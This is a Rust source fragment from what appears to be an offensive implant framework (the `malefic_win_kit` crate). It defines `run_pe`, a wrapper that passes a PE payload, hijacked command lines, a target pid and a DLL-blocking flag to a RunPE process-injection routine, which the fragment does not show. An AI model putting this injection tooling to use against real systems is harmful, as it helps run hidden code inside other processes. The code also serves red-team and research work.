pub unsafe fn run_pe(
    start_commandline: &[u8],
    hijack_commandline: &[u8],
    data: &[u8],
    entrypoint: &[u8],
    args: &[u8],
    is_x86: bool,
    pid: u32,
    block_dll: bool,
    need_output: bool
) -> Vec<u8> {
    #[cfg(feature = "prebuild")]
    {
        let ret = crate::win::kit::RunPE(
            start_commandline.as_ptr(),
            start_commandline.len(),
            hijack_commandline.as_ptr(),
            hijack_commandline.len(),
            data.as_ptr(),
            data.len(),
            entrypoint.as_ptr(),
            entrypoint.len(),
            args.as_ptr(),
            args.len(),
            is_x86,
            pid,
            block_dll,
            need_output
        );
        let str = String::from_raw_parts(ret.data, ret.len, ret.capacity);
        str.as_bytes().to_vec()
    }
    #[cfg(feature = "source")]
    {
        use malefic_win_kit::pe::RunPE::RunPE;
        match RunPE(
            start_commandline.as_ptr(),
            start_commandline.len(),
            hijack_commandline.as_ptr(),
            hijack_commandline.len(),
            data.as_ptr(),
            data.len(),
            entrypoint.as_ptr(),
            entrypoint.len(),
            args.as_ptr(),
            args.len(),
            is_x86,
            pid,
            block_dll,
            need_output
        ) {
            Ok(ret) => {
                ret
            },
            Err(e) => {
                e.as_bytes().to_vec()
            }
        }
    }
}